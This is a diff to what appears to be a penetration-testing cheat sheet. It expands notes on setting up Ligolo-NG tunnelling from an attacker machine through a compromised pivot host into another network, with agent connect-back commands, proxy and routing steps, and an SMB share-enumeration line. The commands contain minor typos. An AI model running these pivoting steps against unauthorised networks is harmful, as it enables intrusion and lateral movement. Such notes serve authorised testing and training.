@@ -97,22 +97,55 @@ sudo proxychains4 -q nxc smb $IP -u [user] -p [pass] --shares
 ```
 
 # [Ligolo-NG](https://github.com/nicocha30/ligolo-ng)
-### Pivot Host Setup
-* Upload the appropriate binary to the pivot host
-* Execute the agent on the pivot host
+## Setting up the pivot host (The machine your tunneling through to reach another network)
+### Upload and configure the appropriate binary to the pivot host
+> Find the latest binaries on the releases page [here](https://github.com/Nicocha30/ligolo-ng)
+- Connect the agent to the pivot host.
 ```bash
 # Linux & Windows
-./agent -connect [AttackerIP]:11601
+./agent -connect [AttackerIP]:port -v -accept-fingerprint [Cert Fingerprint noted below]
 ```
-### Attacker Machine Setup
-* Create the interface for Ligolo to use
+- Configure the agent to receive a connection from the attacker machine
+```
+./agent
+* ligolo-agent -bind 127.0.0.1:[port]
+# You should see the agent bind on the attacker machine.
+```
+## Attacker Machine Setup
+### Proxy Setup
+- Run the agent
+```
+sudo ./proxy -autocert
+```
+- Note down the certificate fingerprint
+- Setup the interface
 ```bash
-sudo ip tuntap add user <username> mode tun ligolo
+ligolo-ng >> interface_create --name "[Insert creative stupid name here]"
+```
+- Connect to the agent (if connecting to the agent, rather than recieving a connection from the agent.
+```
+ligolo-ng >> connect_agent --ip [IP]:[port]
+```
+- When the agent is connected, a session should appear on the proxy similar to:
+```
+INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"
+```
+- Use `session` to select the agent
+```
+ligolo-ng >> session
+# Select the appropriate numbered agent
+```
+- Start the tunnel
+```
+[Agent : [user@hostname] >> tunnel_start --tun [Insert creative stupid name created above here]
+```
+- Setup routing
+```
+# Manually
+sudo ip route add [dest_subnet/cidr] dev ligolo
 
-sudo ip link set ligolo up
-
-# Verify iface added
-ip addr show ligolo
+# Ligolo-NG
+interace_add_route --name [creative stupid name] --route [dest net/cidr]
 ```
 # Todo
 - [ ] Test Ligolo
